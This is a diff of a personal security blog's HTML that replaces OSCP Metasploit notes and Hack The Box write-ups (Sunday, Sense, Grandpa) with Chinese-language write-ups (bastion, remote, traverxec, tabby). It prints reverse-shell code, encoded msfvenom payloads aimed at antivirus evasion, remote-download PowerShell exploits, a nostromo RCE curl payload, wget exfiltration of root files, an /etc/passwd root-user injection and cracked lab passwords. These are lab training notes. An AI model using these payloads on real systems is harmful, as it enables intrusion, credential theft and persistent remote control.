-<h5 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h5><h5 id="Distributed-Component-Object-Model"><a href="#Distributed-Component-Object-Model" class="headerlink" title="Distributed Component Object Model"></a>Distributed Component Object Model</h5><h4 id="Active-Directory-Persistence"><a href="#Active-Directory-Persistence" class="headerlink" title="Active Directory Persistence"></a>Active Directory Persistence</h4><h5 id="Golden-Tickets"><a href="#Golden-Tickets" class="headerlink" title="Golden Tickets"></a>Golden Tickets</h5><h5 id="Domain-Controller-Synchronization"><a href="#Domain-Controller-Synchronization" class="headerlink" title="Domain Controller Synchronization"></a>Domain Controller Synchronization</h5><h3 id="22-the-Metasploit-framework"><a href="#22-the-Metasploit-framework" class="headerlink" title="22.the Metasploit framework"></a>22.the Metasploit framework</h3><p><code>show -h</code><br><code>services</code>|<code>services -h</code><br><code>db_nmap</code><br><code>hosts</code><br><code>services -p 445</code><br><code>info exploit/windows/http/syncbreeze_bof</code></p>
-<h4 id="Metasploit-payloads"><a href="#Metasploit-payloads" class="headerlink" title="Metasploit payloads"></a>Metasploit payloads</h4><h5 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a>Staged vs Non-Staged Payloads</h5><p>A non-Staged payload is sent in its entirety along with the exploit.In contrast,a staged payload is usually sent in two parts.The first part contains a small primary payload that causes the victim machine to connect back to the attacker,transfer a larger secondary payload containing the rest of the shellcode,and then execute it.<br>There are several situations in which we would perfer to use staged shellcode in stead of non-staged.</p>
-<ul>
-<li>the vulnerability we are exploiting does not have enough buffer space to hold a full payload</li>
-<li>the staged payload which may pass the antivirus software</li>
-</ul>
-<h5 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h5><p><code>search meterpreter type:payload</code></p>
-<h5 id="experimenting-with-meterpreter"><a href="#experimenting-with-meterpreter" class="headerlink" title="experimenting with meterpreter"></a>experimenting with meterpreter</h5><p><code>help</code><br><code>sysinfo</code><br><code>getuid</code><br><code>upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec</code><br><code>download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</code><br><code>shell</code><br><code>ftp 127.0.0.1</code></p>
-<h5 id="Executable-Payloads"><a href="#Executable-Payloads" class="headerlink" title="Executable Payloads"></a>Executable Payloads</h5><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe</code><br>-p is to set the payload<br>-f is to set the output format<br>-o is to specify the output file name<br>-e is to specify the encoder type<br>-i is to set the desired number of encoding iterations<br>-x is to specify the file to inject into<br>or we can generate the payload in msf<br>    use payload&#x2F;windows&#x2F;shell_reverse_tcp<br>    set LHOST 10.11.0.4<br>    set LPORT 443<br>    generate -f exe -e x86&#x2F;shikata_ga_nai -i 9 -x &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;binaries&#x2F;plink.exe -o shell_reverse_msf_encoded_embedded.exe&#96;</p>
-<h5 id="Metasploit-Exploit-Multi-Handler"><a href="#Metasploit-Exploit-Multi-Handler" class="headerlink" title="Metasploit Exploit Multi Handler"></a>Metasploit Exploit Multi Handler</h5><p>this moudle works for all single and multi-stage payloads</p>
-<h5 id="Client-Side-Attacks"><a href="#Client-Side-Attacks" class="headerlink" title="Client-Side Attacks"></a>Client-Side Attacks</h5><p><code>msfvenom -l formats</code><br>hta-psh,vba,vba-psh are designed for use in client-side attacks</p>
-<h5 id="Advanced-Features-and-Transports"><a href="#Advanced-Features-and-Transports" class="headerlink" title="Advanced Features and Transports"></a>Advanced Features and Transports</h5><p><code>show advanced</code><br><code>StageEncoder</code><br><code>AutoRunScript</code><br><code>transport list</code></p>
-<pre><code>transport add -t reverse_tcp -l 10.11.0.4 -p 5555
-background
-use multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 10.11.0.4
-set LPORT 5555
-exploit -j
-sessions -i 5
-transport next
-sessions -i 6
-</code></pre>
-<h4 id="Building-Our-Own-MSF-Moudle"><a href="#Building-Our-Own-MSF-Moudle" class="headerlink" title="Building Our Own MSF Moudle"></a>Building Our Own MSF Moudle</h4><h4 id="Post-Exploitation-with-Metasploit"><a href="#Post-Exploitation-with-Metasploit" class="headerlink" title="Post-Exploitation with Metasploit"></a>Post-Exploitation with Metasploit</h4><h5 id="Core-Post-Exploitation-Features"><a href="#Core-Post-Exploitation-Features" class="headerlink" title="Core Post-Exploitation Features"></a>Core Post-Exploitation Features</h5><p><code>screenshot</code><br><code>keyscan_start</code>—<code>keyscan_dump</code>—<code>keyscan_stop</code></p>
-<h5 id="Migrating-Processes"><a href="#Migrating-Processes" class="headerlink" title="Migrating Processes"></a>Migrating Processes</h5><p><code>ps</code>—&gt;<code>migrate 3586</code></p>
-<h5 id="Post-Exploitation-Modules"><a href="#Post-Exploitation-Modules" class="headerlink" title="Post-Exploitation Modules"></a>Post-Exploitation Modules</h5><p><code>use exploit/windows/local/bypassuac_injection_winsxs</code>—&gt;<code>load powershell</code>—&gt;<code>help powershell</code>—&gt;<code>powershell_execute &quot;$PSVersionTable.PSVersion&quot;</code>—&gt;<code>load kiwi</code>—&gt;<code>getsystem</code>—&gt;<code>creds_msv</code></p>
-<h5 id="Pivoting-with-the-Metasploit-Framework"><a href="#Pivoting-with-the-Metasploit-Framework" class="headerlink" title="Pivoting with the Metasploit Framework"></a>Pivoting with the Metasploit Framework</h5><h4 id="Metasploit-Automation"><a href="#Metasploit-Automation" class="headerlink" title="Metasploit Automation"></a>Metasploit Automation</h4><h2 id="setup-rc"><a href="#setup-rc" class="headerlink" title="setup.rc"></a>setup.rc</h2><pre><code>use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 10.11.0.4
-set LPORT 443
-set EnableStageEncoding true
-set StageEncoder x86/shikata_ga_nai
-set AutoRunScript post/windows/manage/migrate
-set ExitOnSession false
-exploit -j -z
-</code></pre>
-<p>msfconsole -r setup.rc</p>
-<h3 id="23-powershell-empire"><a href="#23-powershell-empire" class="headerlink" title="23.powershell empire"></a>23.powershell empire</h3><h4 id="Installation-Setup-and-Usage"><a href="#Installation-Setup-and-Usage" class="headerlink" title="Installation,Setup,and Usage"></a>Installation,Setup,and Usage</h4><p><code>git clone https://github.com/PowerShellEmpire/Empire.git</code><br><code>./setup/install.sh</code><br><code>./empire</code><br><code>help</code></p>
+<p>echo “bmfx:DcqfpgDB7cBZU:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt; &#x2F;etc&#x2F;passwd<br>&#96;</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/28/oscp/" data-id="cl7edtt4f000gjtcp7kom3gam" data-title="oscp" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/05/popcorn/" data-id="cl7ptut8l00002ycpe0v89vt0" data-title="popcorn" class="article-share-link">Share</a>
       
       
       
@@ -852,10 +503,10 @@ exploit -j -z
 
 
   
-    <article id="post-Irked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-bastion" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/27/Irked/" class="article-date">
-  <time class="dt-published" datetime="2022-07-27T14:14:08.000Z" itemprop="datePublished">2022-07-27</time>
+    <a href="/2022/09/05/bastion/" class="article-date">
+  <time class="dt-published" datetime="2022-09-05T07:10:57.000Z" itemprop="datePublished">2022-09-05</time>
 </a>
     
   </div>
@@ -866,7 +517,7 @@ exploit -j -z
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/27/Irked/">Irked</a>
+      <a class="p-name article-title" href="/2022/09/05/bastion/">bastion</a>
     </h1>
   
 
@@ -874,13 +525,35 @@ exploit -j -z
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/27/Irked/nmap.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/05/bastion/nmap1.png">
+<img src="/2022/09/05/bastion/nmap2.png">
+#### port explore
+135是smb服务，先尝试用smbmap扫描一下
+`smbmap -H 10.10.10.134 -u abc`
+<img src="/2022/09/05/bastion/smbmap.png">
+再用smbclient探索一下backup文件夹
+`smbclient -N -L //10.10.10.134`
+使用smbclient连接到backups
+`smbclient -N //10.10.10.134/Backups`
+<img src="/2022/09/05/bastion/smbbackup.png">
+<img src="/2022/09/05/bastion/note.png">
+当目标文件过大时，可以尝试把需要的东西挂载到自己的电脑上
+`mount -t cifs //10.10.10.134/backups /mnt -o user=,password=`
+`find /mnt -type f`
+<img src="/2022/09/05/bastion/file.png">
+其中存在两个vhd文件
+接下来是搜索vhd文件中有用的东西
+使用guestmount将两个文件分别进行挂载
+`guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/`
+第一个vhd挂载失败，第二个挂载上以后卡死，暂时做不了
 
+<p>根据writeup，用ssh连接<a href="mailto:&#76;&#x34;&#x6d;&#112;&#x6a;&#101;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#46;&#49;&#x30;&#46;&#49;&#51;&#52;">&#76;&#x34;&#x6d;&#112;&#x6a;&#101;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#46;&#49;&#x30;&#46;&#49;&#51;&#52;</a>，密码为bureaulampje</p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>在programfiles文件夹中，存在一个mRemoteNG<br>同样它也是一个远程连接工具<br>在用户的AppData文件夹下存在confCons.xml文件<br><img src="/2022/09/05/bastion/node1.png"><br><img src="/2022/09/05/bastion/node2.png"><br>里面存了一个DC和一个L4mpje-PC的帐号和密码<br>可以用(mRemoteNG Decrypt)[<a target="_blank" rel="noopener" href="https://github.com/kmahyyg/mremoteng-decrypt]%E7%A0%B4%E8%A7%A3%E8%AF%A5%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A0%81">https://github.com/kmahyyg/mremoteng-decrypt]破解该加密密码</a><br><img src="/2022/09/05/bastion/pass.png"><br>得到administrator的登陆密码为thXLHM96BeKL0ER2<br>用ssh连接，成功获得administrator权限<br><img src="/2022/09/05/bastion/root.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/27/Irked/" data-id="cl7edtt4a0009jtcp1kh152o3" data-title="Irked" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/05/bastion/" data-id="cl7ogf01d0000z0cpatfp63o6" data-title="bastion" class="article-share-link">Share</a>
       
       
       
@@ -892,10 +565,10 @@ exploit -j -z
 
 
   
-    <article id="post-Sunday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-remote" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/25/Sunday/" class="article-date">
-  <time class="dt-published" datetime="2022-07-25T09:38:50.000Z" itemprop="datePublished">2022-07-25</time>
+    <a href="/2022/09/04/remote/" class="article-date">
+  <time class="dt-published" datetime="2022-09-05T02:36:22.000Z" itemprop="datePublished">2022-09-04</time>
 </a>
     
   </div>
@@ -906,7 +579,7 @@ exploit -j -z
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/25/Sunday/">Sunday</a>
+      <a class="p-name article-title" href="/2022/09/04/remote/">remote</a>
     </h1>
   
 
@@ -914,66 +587,68 @@ exploit -j -z
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/25/Sunday/nmapscan.png">
-
-<h5 id="finger"><a href="#finger" class="headerlink" title="finger"></a>finger</h5><p>The finger daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.<br>we can use <a href>finger-user-enum</a> to brute force it.</p>
-<pre><code>wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
-perl finger-user-enum.pl -U /usr/share/SecLists/Usernames/Names/names.txt -t 10.10.10.76
-######## Scan started at Sun Oct  7 08:57:50 2018 #########
-access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt;..nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;..
-admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..uucp
-anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
-bin@10.10.10.76: bin             ???                         &lt; .  .  .  . &gt;..
-dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
-jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
-la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
-line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
-message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;..
-miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
-sammy@10.10.10.76: sammy                 pts/2        &lt;Apr 24 12:57&gt; 10.10.14.4          ..
-sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24 10:48&gt; 10.10.14.4          ..
-sys@10.10.10.76: sys             ???                         &lt; .  .  .  . &gt;..
-zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
-######## Scan completed at Sun Oct  7 09:03:50 2018 #########
-14 results.
-</code></pre>
-<p>there are some useless information in it,but sammy and sunny seems useful<br><img src="/2022/07/25/Sunday/useful.png"></p>
-<h4 id="2-get-user-access"><a href="#2-get-user-access" class="headerlink" title="2.get user access"></a>2.get user access</h4><p>with sammy and sunny,we can try to enum password<br>use hydra to brute password<br>    hydra -L user.txt -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -I -f  -s 22022 10.10.10.76 ssh<br>and we will get a cred sunny&#x2F;sunday<br>now we can use ssh to login<br><img src="/2022/07/25/Sunday/user.png"><br>we can execute &#x2F;root&#x2F;troll without password<br>Inside &#x2F;backup there’s a copy of a shadow file that is world readable:<br><img src="/2022/07/25/Sunday/backup.png"><br><img src="/2022/07/25/Sunday/agent22.png"><br><img src="/2022/07/25/Sunday/shadow.png"></p>
-<p>use hashcat to get passwd</p>
-<pre><code>hashcat -m 7400 sunday.hash /usr/share/wordlists/rockyou.txt --force
-</code></pre>
-<img src="/2022/07/25/Sunday/sammy.png">
-and we can login with sammy
-<img src="/2022/07/25/Sunday/sammylogin.png">
-
-<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>the first way to get root is to use sammy wget to get root.txt<br><img src="/2022/07/25/Sunday/roottxt.png"></p>
-<h5 id="way-1"><a href="#way-1" class="headerlink" title="way 1"></a>way 1</h5><p>The easiest way to just get the flag is to take advantage of the –input-file or -i flag on wget. This flag allows you to provide a file with the urls to visit. When it reads the hash, the string will fail to process as a url, and will tell us so in an error message, complete with flag:<br><img src="/2022/07/25/Sunday/root1.png"></p>
-<h5 id="way-2"><a href="#way-2" class="headerlink" title="way 2"></a>way 2</h5><p>A second method to exfil the flag is to have wget post the file back to us using <code>--post-file</code>,but python SimpleHTTPServer doesn’t support POST requests<br><img src="/2022/07/25/Sunday/way2.1.png"><br>but in this case,we just need to use nc to get the information<br>    sudo wget –post-file &#x2F;root&#x2F;root.txt <a target="_blank" rel="noopener" href="http://10.10.16.10:8888/">http://10.10.16.10:8888/</a><br><img src="/2022/07/25/Sunday/way2.2.png"></p>
-<h5 id="way-3"><a href="#way-3" class="headerlink" title="way 3"></a>way 3</h5><p>because the sunny can execute troll without password<br>we can try to overwrite this file<br>first write a python script</p>
-<pre><code>#! /bin/bash
-import os
-import socket
-import subprocess
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((&quot;10.10.16.10&quot;,8888))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
-</code></pre>
-<p>using the -O option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists</p>
-<pre><code>sudo wget http://10.10.16.10/reverse.py -O /root/troll
-</code></pre>
-<p>but this method may fail because the script reset itself per 5 seconds</p>
-<h5 id="way-4"><a href="#way-4" class="headerlink" title="way 4"></a>way 4</h5><p>we can overwrite other files we can execute,such as passwd<br><img src="/2022/07/25/Sunday/way4.png"></p>
-<h5 id="way-5-overwrite-shadow"><a href="#way-5-overwrite-shadow" class="headerlink" title="way 5 overwrite shadow"></a>way 5 overwrite shadow</h5><p>make a root user copied from sunny<br>and get it<br><img src="/2022/07/25/Sunday/way5.1.png"><br><img src="/2022/07/25/Sunday/way5.2.png"></p>
-<h5 id="way-6"><a href="#way-6" class="headerlink" title="way 6"></a>way 6</h5><p>Overwrite sudoers<br>Let’s change that slightly in a copy on our local host, giving sammy the ability to run su without password:<br><img src="/2022/07/25/Sunday/way6.1.png"><br><img src="/2022/07/25/Sunday/way6.2.png"></p>
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/04/remote/nmap1.png">
+<img src="/2022/09/04/remote/nmap2.png">
+<img src="/2022/09/04/remote/nmap3.png">
+#### port explore
+21端口允许匿名登录，但是登录进去没有任何东西
+80端口是一个网页，看不懂
+111,135是rpc的端口，用rpcclient试一下空用户名
+`rpcclient -U "" -N 10.10.10.180 -p 111`
+拒绝连接
+139,445是smb的端口，可以尝试smbclient登录一下
+`smbclient -N -L //10.10.10.180`,失败
+2049端口是NFS服务，showmount可以给出挂载的路径和能够进行挂载的人
+<img src="/2022/09/04/remote/nfs.png">
+把这个目录挂载到自己的机器上：`mount -t nfs 10.10.10.180:/site_backups /mnt/`
+<img src="/2022/09/04/remote/mnt.png">
+在/App_Data下存在一个Umbraco.sdf的文件，.sdf是一种典型的数据库格式的文件
+直接查看的时候显示很混乱，但是当使用strings的时候，列出了一些用户名和密码
+<img src="/2022/09/04/remote/user.png">
+根据我们得到的信息可以推测存在一个admin@htb.local,且其hash为b8be16afba8c314ad33d812f22a04991b90e2aaa，加密算法为SHA1
+另一个用户为smith@htb.local,其hash为jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=，加密算法为HMACSHA256
+拿到本地用hashcat破解一下
+`hashcat -m 100 adminpass -w=/usr/share/wordlist/rockyou.txt --force`
+<img src="/2022/09/04/remote/admin.png">
+密码为baconandcheese
+用这个用户名和密码我们能够登录到http://10.10.10.180/umbraco
+得到这个网站的version为7.12.4
+searchsploit umbraco看看，发现确实存在漏洞
+<img src="/2022/09/04/remote/ss.png">
+<img src="/2022/09/04/remote/payload.png">
+用法是用用户名加密码加要执行的命令
+<img src="/2022/09/04/remote/payload2.png">
+发现确实可以进行利用
+先让目标机从本地机器上下载一个shell
+把nishang下的revertcpshell.ps1修改一下，在最下面加上一行反弹shell的命令
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 8888`
+`python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "iex(new-object net.webclient).downloadstring('http://10.10.14.4/rev.ps1')"`
+成功接收到反弹的shell
+<img src="/2022/09/04/remote/shell.png">
+#### 目录扫描
+<img src="/2022/09/04/remote/dir.png">
+#### administrator
+查看目标机上运行的程序，会发现一个TeamViewer_Service.exe
+作为一个服务器，它一定存有凭据供别人进行远程登录
+这里可以先上传一个winpeas进行信息收集
+在C:\Program Files (x86)\TeamViewer内我们可以得到该teamviewer的版本为versin7
+根据cve-2019-18988，teamviewer将用户名和密码写在注册表里
+那我们可以查看一下注册表里的信息
+`cd HKLM:\software\wow6432node\teamviewer\version7`
+`get-itemproperty -path .`
+<img src="/2022/09/04/remote/r.png">
+接着列举SecurityPasswordAES
+`(get-itemproperty -path .).SecurityPasswordAES`
+<img src="/2022/09/04/remote/aes.png">
+对照msf中的破解teamviewer密码的脚本，创建一个python脚本
+得到远程登录的密码为!R3m0te!
+可以用crackmapexec,evil-winrm,psexec,wmiexec获得一个shell
+<img src="/2022/09/04/remote/root.png">
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/25/Sunday/" data-id="cl7edtt4e000ejtcp40zogx2l" data-title="Sunday" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/04/remote/" data-id="cl7of3c970000lhcpdg9xb11r" data-title="remote" class="article-share-link">Share</a>
       
       
       
@@ -985,10 +660,10 @@ p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
 
 
   
-    <article id="post-Sense" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-traverxec" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/24/Sense/" class="article-date">
-  <time class="dt-published" datetime="2022-07-25T01:23:10.000Z" itemprop="datePublished">2022-07-24</time>
+    <a href="/2022/09/04/traverxec/" class="article-date">
+  <time class="dt-published" datetime="2022-09-04T10:13:14.000Z" itemprop="datePublished">2022-09-04</time>
 </a>
     
   </div>
@@ -999,7 +674,7 @@ p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/24/Sense/">Sense</a>
+      <a class="p-name article-title" href="/2022/09/04/traverxec/">traverxec</a>
     </h1>
   
 
@@ -1007,31 +682,56 @@ p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/24/Sense/nmap.png">
-the home page is a login page
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/04/traverxec/nmap.png">
+#### port explore
+80:是一个templatemag搭建的网站
+#### 目录搜索
+<img src="/2022/09/04/traverxec/dir.png">
+nmap扫出来的80端口显示的是nostromo 1.9.6
+searchsploit后发现确实存在一个rce漏洞针对nostromo
+<img src="/2022/09/04/traverxec/payload.png">
+所以我们可以利用其中的payload
+`curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d "id | nc 10.10.14.4 8888"`
+<img src="/2022/09/04/traverxec/wwwshell.png">
+在验证了可行性之后，我们将payload改为回弹shell的一个payload
+`curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.4/8888 0>&1"'`
+<img src="/2022/09/04/traverxec/www.png">
+用linenum.sh查看一下系统中是否有需要注意的
+<img src="/2022/09/04/traverxec/pass.png">
+将该密码放入hashcat中跑一下
+<img src="/2022/09/04/traverxec/hash.png">
+密码是Nowonly4me
+在/var/nostromo/conf下，存在一个配置文件
+<img src="/2022/09/04/traverxec/conf.png">
+/homedirs /home指向了nostromo的home目录,在一个用户目录下, the webroot will be public_www。所以http://10.10.10.165/~david will be /home/david/public_www。
+访问/～david目录,但该网站表示无权访问
+<img src="/2022/09/04/traverxec/pri.png">
+尝试访问
+`http://10.10.10.165/~david/.%0d./`
+`http://10.10.10.165/~david/.%0D./.ssh/`
+`http://10.10.10.165/~david/.%0D./user.txt`
+`http://10.10.10.165/~david/index.html`
+均无有用结果
+在/home/david/public_www/protected-file-area中，我们可以发现一个备份文件
+<img src="/2022/09/04/traverxec/back.png">
+用nc将该tar文件传到本机进行分析
+`cat backup-ssh-identity-files.tgz | nc 10.10.14.4 8888`
+`nc -nlvp 8888 > backup-identity-files.tgz.b64`
+解压后存在公钥和私钥
+该公钥是加密过的形式，要用john破解需要先用ssh2john转化格式
+`ssh2john id_rsa > id_rsa.john`
+`john -w=/usr/share/wordlist/rockyou.txt id_rsa.john`
+<img src="/2022/09/04/traverxec/sshpass.png">
+得到连接密码hunter
+用ssh连接david，密码不正确，该密码是phrase for key
+<img src="/2022/09/04/traverxec/user.png">
 
-<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><img src="/2022/07/24/Sense/dir1.png">
-<img src="/2022/07/24/Sense/dir2.png">
-the changelog.txt shows some message that we may can use
-<img src="/2022/07/24/Sense/changelog.png">
-all php pages need login
-
-<h5 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h5><p>the gobuster <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/121576425">knowledge</a></p>
-<pre><code>gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt
-</code></pre>
-<ul>
-<li>-k - 跳过SSL证书的验证</li>
-<li>-x <extensions> - 要检查的扩展名列表（如果有）<img src="/2022/07/24/Sense/gobuster.png">
-we can find a system-users.txt
-<img src="/2022/07/24/Sense/system-users.png"></extensions></li>
-</ul>
-<p>the password we can guess is the default page - pfsense<br>username: Rohit<br>password: company defaults—-pfsense<br>and we success<br><img src="/2022/07/24/Sense/pfsense.png"></p>
-<h5 id="search-sploit"><a href="#search-sploit" class="headerlink" title="search sploit"></a>search sploit</h5><p>we can find a 43560.py matches the pfsense 2.1.3<br>let’s have a try and we get a root access<br><img src="/2022/07/24/Sense/rootaccess.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>sudo -l用不了，因为没有david的密码<br>在david目录下有一个bin文件夹，进入该文件夹后存在一个server-stats.sh<br>执行该脚本文件<br>查看该脚本文件，可以发现最后一行调用了sudo并且未输入密码，所以david一定在sudo列表里<br><img src="/2022/09/04/traverxec/sudo.png"><br>最后一行用sudo调用了journalctl<br>如果journalctl能能把输出放到当前页，那它就会把输出输出到stdout<br>但是如果输出不下，则会以less形式展示出来，所以需要把控制台缩小到5行以下，让journalstl以less形式输出结果，用less输出的时候我的身份仍是root,然后在less里面调用!&#x2F;bin&#x2F;bash,获得root权限<br><img src="/2022/09/04/traverxec/root1.png"><br><img src="/2022/09/04/traverxec/root2.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/24/Sense/" data-id="cl7edtt4e000djtcpdfctg1md" data-title="Sense" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/04/traverxec/" data-id="cl7of3c9c0001lhcp7csl90jv" data-title="traverxec" class="article-share-link">Share</a>
       
       
       
@@ -1043,10 +743,10 @@ we can find a system-users.txt
 
 
   
-    <article id="post-Grandpa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-tabby" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/22/Grandpa/" class="article-date">
-  <time class="dt-published" datetime="2022-07-22T09:44:48.000Z" itemprop="datePublished">2022-07-22</time>
+    <a href="/2022/09/03/tabby/" class="article-date">
+  <time class="dt-published" datetime="2022-09-03T11:43:34.000Z" itemprop="datePublished">2022-09-03</time>
 </a>
     
   </div>
@@ -1057,7 +757,7 @@ we can find a system-users.txt
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/22/Grandpa/">Grandpa</a>
+      <a class="p-name article-title" href="/2022/09/03/tabby/">tabby</a>
     </h1>
   
 
@@ -1065,32 +765,79 @@ we can find a system-users.txt
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/22/Grandpa/nmap.png">
-it looks like granny
-<img src="/2022/07/22/Grandpa/dirsearch.png">
-<img src="/2022/07/22/Grandpa/asp.png">
-
-<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><pre><code>davtest -url http://10.10.10.14
-</code></pre>
-<p>but it shows nothing can use<br><img src="/2022/07/22/Grandpa/davtest.png"></p>
-<h5 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h5><p>the iis 6.0 is too old,so we can use msf&#x2F;searchsploit to search some exploits<br><img src="/2022/07/22/Grandpa/searchsploit.png"></p>
-<h4 id="2-get-web-access"><a href="#2-get-web-access" class="headerlink" title="2.get web access"></a>2.get web access</h4><p>we can try to use <a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">script</a><br><img src="/2022/07/22/Grandpa/pyscript.png"></p>
-<pre><code>python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.16.10 8888
-</code></pre>
